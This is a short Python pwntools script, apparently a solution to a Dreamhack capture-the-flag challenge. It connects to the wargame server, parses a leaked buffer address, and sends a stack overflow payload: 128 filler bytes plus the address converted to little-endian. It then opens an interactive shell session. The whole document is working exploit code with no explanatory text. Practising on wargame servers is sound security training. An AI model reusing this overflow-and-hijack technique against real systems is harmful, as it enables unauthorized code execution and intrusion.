from pwn import remote
import struct

port = 14573
rem = remote("host3.dreamhack.games", port)

rec = rem.recvline().decode('utf-8')
start = rec.index('(') + 3
end = rec.index(')')
buf = rec[start : end]

payload = b'A' * 128        #|       buf      |
# payload += b'B' * 0x8        #|       SFP      |
endian = ''
for i in range(len(buf) // 2) :
  endian += buf[len(buf) - 2 - i * 2 : len(buf) - i * 2]
payload += bytes.fromhex(endian)
print(payload)

rem.sendline(payload)

rem.interactive()